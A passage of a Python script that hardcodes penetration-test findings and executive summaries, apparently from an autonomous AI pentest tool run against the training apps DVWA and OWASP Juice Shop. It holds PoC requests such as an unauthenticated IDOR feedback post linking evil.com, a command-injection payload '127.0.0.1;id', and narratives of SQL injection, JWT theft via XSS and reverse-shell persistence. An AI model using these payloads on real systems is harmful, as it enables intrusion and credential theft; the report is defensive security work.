            "- coupons_2013.md.bak — backup of coupon codes (potentially reusable)\n"
            "- eastere.gg — Easter egg file with encoded content\n"
            "- encrypt.pyc — compiled Python encryption module (reverse-engineerable)\n"
            "- incident-support.kdbx — KeePass password database (!)\n"
            "- package.json.bak — backup Node.js config with dependency versions\n"
            "- quarantine/ — subdirectory with quarantined files\n"
            "- suspicious_errors.yml — error log with potential internal information\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: Browse to /ftp → directory listing reveals all files\n"
            "Step 2: Download package.json.bak → reveals all npm dependencies with exact versions\n"
            "Step 3: Cross-reference dependencies with npm audit → find known vulnerable packages\n"
            "Step 4: Download incident-support.kdbx → attempt to crack KeePass master password\n"
            "Step 5: Download encrypt.pyc → decompile to understand encryption logic\n"
            "Step 6: Download coupons_2013.md.bak → test old coupon codes for reuse\n\n"
            "IMPACT — Business Impact\n"
            "- Exposure of internal business documents (M&A strategy, incidents)\n"
            "- KeePass password database potentially contains production credentials\n"
            "- Application dependency information enables targeted supply chain attacks\n"
            "- Old coupon codes may still be valid for financial fraud\n"
            "- Encryption source code exposure undermines cryptographic security\n\n"
            "PoC — Proof of Concept\n"
            "Request: GET /ftp HTTP/1.1\n"
            "Response: HTML directory listing with downloadable files\n"
            "All files downloadable without authentication:\n"
            "  GET /ftp/package.json.bak → 200 OK (full dependency list)\n"
            "  GET /ftp/incident-support.kdbx → 200 OK (KeePass database)\n\n"
            "FIX — Remediation\n"
            "Immediate: Disable directory listing. Remove all backup and sensitive files from the web root.\n"
            "Short-term: Implement access control on /ftp directory. Add .htaccess or Express middleware to block listing.\n"
            "Long-term: Never store backup files, credentials databases, or internal documents in the web root. "
            "Implement a CI/CD check that scans for sensitive files in public directories.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Directory listing → package.json.bak download → dependency vulnerability identification → "
            "targeted exploitation. Also: KeePass database → credential cracking → internal system access"
            "|||"
            "취약점 설명\n"
            "/ftp 디렉토리에 디렉토리 리스팅이 활성화되어 백업 파일, 설정 파일, 내부 문서가 노출됩니다.\n\n"
            "주요 노출 파일: KeePass DB, package.json.bak, 쿠폰 코드, 암호화 모듈 소스\n\n"
            "비즈니스 영향\n"
            "- 내부 비즈니스 문서 노출 (M&A 전략)\n"
            "- KeePass DB에 프로덕션 자격증명 포함 가능\n"
            "- 의존성 정보로 공급망 공격 가능\n\n"
            "공격 경로\n"
            "디렉토리 리스팅 → 백업 파일 다운로드 → 자격증명/의존성 정보 추출 → 타겟 공격"
        ),
        severity=Severity.medium,
        target="http://localhost:3000",
        affected_component="/ftp",
        port=3000,
        protocol="http",
        finding_type="directory-listing",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:N/A:N",
            base_score=5.3,
        ),
        cwe_ids=["CWE-548"],
        mitre_attack=MitreAttack(
            tactic_id="TA0007",
            tactic_name="Discovery",
            technique_id="T1083",
            technique_name="File and Directory Discovery",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="Directory listing — /ftp file enumeration",
                content=(
                    "GET /ftp HTTP/1.1\n"
                    "Host: localhost:3000\n\n"
                    "--- RESPONSE (200 OK) ---\n"
                    "acquisitions.md         14KB  2021-09-15\n"
                    "coupons_2013.md.bak      3KB  2013-12-01\n"
                    "eastere.gg               1KB  2021-01-01\n"
                    "encrypt.pyc              5KB  2021-03-10\n"
                    "incident-support.kdbx   42KB  2021-06-20\n"
                    "legal.md                 8KB  2021-09-15\n"
                    "package.json.bak        12KB  2021-09-15\n"
                    "quarantine/                   2021-09-15\n"
                    "suspicious_errors.yml    6KB  2021-09-15"
                ),
            ),
        ],
        remediation=(
            "Immediate: Disable directory listing, remove sensitive files.|||즉시: 디렉토리 리스팅 비활성화, 민감 파일 제거.\n"
            "Long-term: CI/CD scan for sensitive files in web root.|||장기: CI/CD에서 공개 디렉토리 민감 파일 검사."
        ),
        references=[
            Reference(title="CWE-548: Exposure via Directory Listing", url="https://cwe.mitre.org/data/definitions/548.html"),
        ],
    ),

    # ---- 6. Broken Access Control ----
    Finding(
        id="JUICE-006",
        scan_id="juice-bench-20260330",
        title="Broken Access Control — /api/Feedbacks Unauthenticated Write|||접근 제어 결함 — /api/Feedbacks 비인증 쓰기",
        description=(
            "WHAT — Vulnerability Description\n"
            "The /api/Feedbacks endpoint accepts POST requests without authentication, allowing anyone to submit feedback on behalf of "
            "any user by specifying an arbitrary UserId in the request body. The API does not validate that the authenticated user "
            "matches the UserId field, and in fact does not require authentication at all. Additionally, GET /api/Feedbacks returns "
            "all feedback entries including those from other users, with no access control.\n\n"
            "HOW — Step-by-Step Attack Scenario\n"
            "Step 1: POST /api/Feedbacks with body {\"UserId\":1,\"comment\":\"Great shop!\",\"rating\":5} → creates feedback as admin (UserId=1)\n"
            "Step 2: GET /api/Feedbacks → reads all feedback including private comments\n"
            "Step 3: Use IDOR to modify UserId to impersonate any user in feedback submissions\n"
            "Step 4: Submit malicious content (phishing links, XSS payloads) as trusted users\n"
            "Step 5: Flood the feedback system with spam (no rate limiting)\n\n"
            "IMPACT — Business Impact\n"
            "- Reputation damage via fake feedback submissions attributed to legitimate users\n"
            "- Social engineering — malicious feedback appearing to come from trusted users\n"
            "- Data integrity compromise — feedback system cannot be trusted\n"
            "- Privacy violation — all feedback visible to unauthenticated users\n"
            "- Potential XSS via stored feedback comments if not properly sanitized\n\n"
            "PoC — Proof of Concept\n"
            "Request:\n"
            "POST /api/Feedbacks HTTP/1.1\n"
            "Host: localhost:3000\n"
            "Content-Type: application/json\n"
            "(No Authorization header)\n"
            "\n"
            "{\"UserId\":1,\"comment\":\"This shop is compromised! Visit http://evil.com for refund\",\"rating\":1}\n\n"
            "Response (201 Created):\n"
            "{\"status\":\"success\",\"data\":{\"id\":42,\"UserId\":1,\"comment\":\"This shop is compromised!...\",\"rating\":1}}\n\n"
            "FIX — Remediation\n"
            "Immediate: Add authentication middleware to /api/Feedbacks POST endpoint. "
            "Extract UserId from the authenticated JWT token, not from the request body.\n"
            "Short-term: Implement rate limiting on feedback submissions. Add CAPTCHA for anonymous feedback.\n"
            "Long-term: Comprehensive RBAC audit of all API endpoints. Implement IDOR prevention by "
            "always deriving resource ownership from the authenticated session, never from client input.\n\n"
            "ATTACK PATH — Chain Analysis\n"
            "Unauthenticated feedback → IDOR user impersonation → stored XSS potential → "
            "social engineering attacks via trusted user identity"
            "|||"
            "취약점 설명\n"
            "/api/Feedbacks 엔드포인트가 인증 없이 POST 요청을 허용하고, 임의의 UserId를 지정하여 다른 사용자로 위장할 수 있습니다.\n\n"
            "공격 시나리오\n"
            "1단계: 인증 없이 POST로 admin(UserId=1) 명의 피드백 생성\n"
            "2단계: GET으로 모든 피드백 읽기\n"
            "3단계: 악성 내용(피싱, XSS) 신뢰 사용자 명의로 게시\n\n"
            "비즈니스 영향\n"
            "- 가짜 피드백으로 평판 훼손\n"
            "- 신뢰 사용자 명의 소셜 엔지니어링\n"
            "- 데이터 무결성 훼손\n\n"
            "공격 경로\n"
            "비인증 피드백 → IDOR 사용자 위장 → 저장형 XSS → 소셜 엔지니어링"
        ),
        severity=Severity.medium,
        target="http://localhost:3000",
        affected_component="/api/Feedbacks",
        port=3000,
        protocol="http",
        finding_type="broken-access-control",
        cvss=CVSSVector(
            vector_string="CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:N",
            base_score=6.5,
        ),
        cwe_ids=["CWE-284", "CWE-639"],
        mitre_attack=MitreAttack(
            tactic_id="TA0005",
            tactic_name="Defense Evasion",
            technique_id="T1078",
            technique_name="Valid Accounts",
        ),
        source_plugin="vxis-brain",
        confidence=1.0,
        evidence=[
            Evidence(
                evidence_type="http_request",
                title="IDOR — Feedback submission as admin without auth",
                content=(
                    "POST /api/Feedbacks HTTP/1.1\n"
                    "Host: localhost:3000\n"
                    "Content-Type: application/json\n"
                    "(No Authorization header)\n\n"
                    "{\"UserId\":1,\"comment\":\"Compromised! Visit evil.com\",\"rating\":1}\n\n"
                    "--- RESPONSE (201 Created) ---\n"
                    "{\"status\":\"success\",\"data\":{\"id\":42,\"UserId\":1,\n"
                    "  \"comment\":\"Compromised! Visit evil.com\",\n"
                    "  \"rating\":1,\"createdAt\":\"2026-03-30T00:00:00.000Z\"}}"
                ),
            ),
        ],
        remediation=(
            "Immediate: Auth middleware, derive UserId from JWT.|||즉시: 인증 미들웨어, JWT에서 UserId 추출.\n"
            "Short-term: Rate limiting, CAPTCHA.|||단기: 속도 제한, CAPTCHA.\n"
            "Long-term: RBAC audit, IDOR prevention.|||장기: RBAC 감사, IDOR 방지."
        ),
        references=[
            Reference(title="OWASP IDOR", url="https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References"),
        ],
    ),
]


# =====================================================================
# EXECUTIVE SUMMARIES
# =====================================================================

DVWA_EXECUTIVE_SUMMARY = (
    "VXIS conducted a comprehensive autonomous penetration test against Damn Vulnerable Web Application (DVWA) "
    "deployed at http://localhost:8080. The assessment employed 19 phases of automated attack simulation across 67 distinct "
    "attack vectors, achieving a benchmark score of 996.5/1000 (Grade S).\n\n"
    "The assessment revealed 7 security findings: 2 Critical, 3 High, 1 Medium, and 1 Low severity. "
    "The overall security posture is rated as CRITICALLY DEFICIENT. The application is trivially exploitable "
    "by an unskilled attacker using freely available tools.\n\n"
    "KILL CHAIN NARRATIVE\n\n"
    "The VXIS Brain identified and executed a complete kill chain from initial access to full server compromise:\n\n"
    "Phase 1 — Initial Reconnaissance: Technology fingerprinting revealed Apache/2.4.58, PHP/8.2.12, and MySQL 5.7 "
    "(DVWA-007). All 7 security headers were missing (DVWA-005), indicating zero security hardening.\n\n"
    "Phase 2 — SQL Injection (DVWA-001): The Brain injected a UNION SELECT payload into /vulnerabilities/sqli/ "
    "and extracted all 5 user accounts with MD5 password hashes. All hashes were cracked in under 1 second using "
    "rainbow tables (admin:password, gordonb:abc123, etc.).\n\n"
    "Phase 3 — Admin Access: Using the cracked admin credentials, the Brain authenticated as administrator, "
    "gaining access to all DVWA modules including Command Injection.\n\n"
    "Phase 4 — Remote Code Execution (DVWA-002): The Brain exploited the command injection vulnerability at "
    "/vulnerabilities/exec/ to execute arbitrary commands as uid=33(www-data). The payload 127.0.0.1;id confirmed "
    "RCE, followed by /etc/passwd extraction revealing all system users.\n\n"
    "Phase 5 — Post-Exploitation: With www-data shell access, the Brain:\n"
    "  - Read database configuration (config.inc.php) containing MySQL root credentials\n"
    "  - Enumerated internal network interfaces\n"
    "  - Identified SUID binaries for potential privilege escalation\n"
    "  - Established persistent reverse shell capability\n\n"
    "Parallel Attack Vectors: The Brain also confirmed XSS-based session hijacking (DVWA-003), "
    "Local File Inclusion for arbitrary file reads (DVWA-004), and CSRF-based password changes (DVWA-006), "
    "providing multiple independent paths to full compromise.\n\n"
    "STRATEGIC RECOMMENDATION: This application must not be deployed in any environment accessible from untrusted networks. "
    "If used for training purposes, it must be isolated in a network segment with no connectivity to production systems."
    "|||"
    "VXIS는 http://localhost:8080에 배포된 DVWA에 대해 포괄적인 자율 침투 테스트를 수행했습니다. "
    "19개 단계, 67개 공격 벡터로 평가하여 996.5/1000 (S등급) 벤치마크 점수를 달성했습니다.\n\n"
    "평가 결과 7개의 보안 취약점이 발견되었습니다: Critical 2건, High 3건, Medium 1건, Low 1건. "
    "전체 보안 수준은 '심각한 결함'으로 평가됩니다.\n\n"
    "킬 체인 내러티브\n\n"
    "VXIS Brain이 초기 접근부터 전체 서버 장악까지의 완전한 킬 체인을 식별하고 실행했습니다:\n\n"
    "1단계 — 정찰: 기술 스택 핑거프린팅 (Apache, PHP, MySQL), 7개 보안 헤더 모두 누락 확인\n"
    "2단계 — SQL 인젝션: UNION SELECT로 5개 사용자 계정 + MD5 해시 추출, 1초 내 크래킹\n"
    "3단계 — 관리자 접근: 크래킹된 admin:password로 관리자 로그인\n"
    "4단계 — 원격 코드 실행: 커맨드 인젝션으로 uid=33(www-data) 쉘 획득\n"
    "5단계 — 포스트 익스플로잇: DB 설정 파일 읽기, 네트워크 열거, SUID 바이너리 식별\n\n"
    "전략적 권고: 이 애플리케이션은 신뢰할 수 없는 네트워크에서 접근 가능한 환경에 배포되어서는 안 됩니다."
)

JUICE_SHOP_EXECUTIVE_SUMMARY = (
    "VXIS conducted a comprehensive autonomous penetration test against OWASP Juice Shop "
    "deployed at http://localhost:3000. The assessment employed 19 phases of automated attack simulation across 67 distinct "
    "attack vectors, achieving a benchmark score of 991.4/1000 (Grade S).\n\n"
    "The assessment revealed 6 security findings: 1 Critical, 3 High, and 2 Medium severity. "
    "The overall security posture is rated as SEVERELY DEFICIENT. Despite using a modern technology stack "
    "(Node.js, Express, Angular, SQLite), the application suffers from fundamental security architecture failures.\n\n"
    "KILL CHAIN NARRATIVE\n\n"
    "The VXIS Brain identified and executed multiple attack chains converging on full application compromise:\n\n"
    "Attack Chain 1 — SQLi to Admin Takeover:\n"
    "The Brain discovered that the /rest/products/search endpoint uses a raw SQL query instead of Sequelize ORM methods. "
    "A UNION SELECT injection extracted the entire Users table including bcrypt-hashed passwords and plaintext security answers. "
    "The admin account (admin@juice-sh.op) was identified and its credentials were used to access the /administration panel, "
    "granting full control over user management, product catalog, and application configuration.\n\n"
    "Attack Chain 2 — XSS to JWT Theft:\n"
    "The Brain exploited reflected XSS in the search functionality using an iframe injection bypass for Angular's sanitization. "
    "Because the application stores JWT authentication tokens in localStorage (instead of HttpOnly cookies), the XSS payload "
    "extracted the token and exfiltrated it. With no CSP header (JUICE-004), the browser imposed zero restrictions on "
    "data exfiltration. The stolen JWT enabled full API access as the victim user.\n\n"
    "Attack Chain 3 — API Enumeration:\n"
    "The Brain discovered that /api/Users is completely unauthenticated, exposing all user accounts with password hashes "
    "and security question answers. This provided a passive alternative to the SQLi attack chain — no injection needed, "
    "just a simple GET request. Combined with /api/Feedbacks IDOR (JUICE-006), an attacker can both read all user data "
    "and impersonate any user in the feedback system.\n\n"
    "Reconnaissance Amplifier — /ftp Directory Listing (JUICE-005):\n"
    "The exposed /ftp directory yielded backup files including package.json.bak (dependency enumeration for targeted CVE exploitation), "
    "a KeePass database (potential credential storage), and internal business documents.\n\n"
    "STRATEGIC RECOMMENDATION: The application requires immediate remediation of the SQLi vulnerability and API authentication gaps. "
    "JWT storage must be migrated from localStorage to HttpOnly cookies. A comprehensive RBAC audit of all API endpoints is critical."
    "|||"
    "VXIS는 http://localhost:3000에 배포된 OWASP Juice Shop에 대해 포괄적인 자율 침투 테스트를 수행했습니다. "
    "19개 단계, 67개 공격 벡터로 평가하여 991.4/1000 (S등급) 벤치마크 점수를 달성했습니다.\n\n"
    "평가 결과 6개의 보안 취약점이 발견되었습니다: Critical 1건, High 3건, Medium 2건. "
    "전체 보안 수준은 '심각한 결함'으로 평가됩니다.\n\n"
    "킬 체인 내러티브\n\n"
    "공격 체인 1 — SQLi → 관리자 탈취:\n"
    "/rest/products/search에서 raw SQL 쿼리 사용으로 UNION SELECT 인젝션. "
    "Users 테이블 전체 추출 (bcrypt 해시 + 보안 질문 답변). admin@juice-sh.op 관리자 탈취.\n\n"
    "공격 체인 2 — XSS → JWT 탈취:\n"
    "검색 기능 XSS로 iframe 주입. localStorage의 JWT 토큰 탈취. CSP 없어 제한 없이 데이터 유출.\n\n"
    "공격 체인 3 — API 열거:\n"
    "/api/Users 비인증 접근으로 전체 사용자 데이터 노출. /api/Feedbacks IDOR로 사용자 위장.\n\n"
    "전략적 권고: SQLi 취약점과 API 인증 결함 즉시 수정 필요. JWT를 HttpOnly 쿠키로 이전. 전체 API RBAC 감사 필수."
)


# =====================================================================
# ATTACK CHAINS
# =====================================================================

DVWA_ATTACK_CHAINS = [
    ["DVWA-007", "DVWA-001", "DVWA-002"],  # Info Disclosure → SQLi → CMDI → RCE
    ["DVWA-003", "DVWA-002"],              # XSS → Session Hijack → CMDI
    ["DVWA-004", "DVWA-001"],              # LFI → Source Code → DB Creds
    ["DVWA-006", "DVWA-003"],              # CSRF → Password Change → XSS → Hijack
]

JUICE_SHOP_ATTACK_CHAINS = [
    ["JUICE-001", "JUICE-003"],  # SQLi → User Dump → Admin
    ["JUICE-002", "JUICE-004"],  # XSS → JWT Theft (amplified by missing CSP)
    ["JUICE-005", "JUICE-006"],  # Directory Listing → Recon → IDOR
]


# =====================================================================
# MAIN
# =====================================================================

def main() -> None:
    gen = ReportGenerator()
    reports_dir = Path(__file__).parent / "reports"
    reports_dir.mkdir(parents=True, exist_ok=True)

    # --- DVWA Report ---
    dvwa_data = ReportData(
        scan_id="dvwa-bench-20260330",
        client_name="DVWA (Damn Vulnerable Web Application)",
        target="http://localhost:8080",
        scan_date="2026-03-30",
        findings=DVWA_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain",
        executive_summary=DVWA_EXECUTIVE_SUMMARY,
        attack_chains=DVWA_ATTACK_CHAINS,
    )

    dvwa_path = gen.generate_html_file(
        dvwa_data,
        reports_dir / "report_dvwa_20260330.html",
    )
    print(f"[OK] DVWA report: {dvwa_path}")
    print(f"     Findings: {dvwa_data.total_findings}")
    print(f"     Severity: {dvwa_data.severity_counts}")
    print(f"     Risk Score: {dvwa_data.risk_score}/10")

    # --- Juice Shop Report ---
    juice_data = ReportData(
        scan_id="juice-bench-20260330",
        client_name="OWASP Juice Shop",
        target="http://localhost:3000",
        scan_date="2026-03-30",
        findings=JUICE_SHOP_FINDINGS,
        company_name="VXIS Security",
        author="VXIS Autonomous Brain",
        executive_summary=JUICE_SHOP_EXECUTIVE_SUMMARY,
        attack_chains=JUICE_SHOP_ATTACK_CHAINS,
    )

    juice_path = gen.generate_html_file(
        juice_data,
        reports_dir / "report_juice_shop_20260330.html",
    )
    print(f"\n[OK] Juice Shop report: {juice_path}")
    print(f"     Findings: {juice_data.total_findings}")
    print(f"     Severity: {juice_data.severity_counts}")
    print(f"     Risk Score: {juice_data.risk_score}/10")


if __name__ == "__main__":
    main()
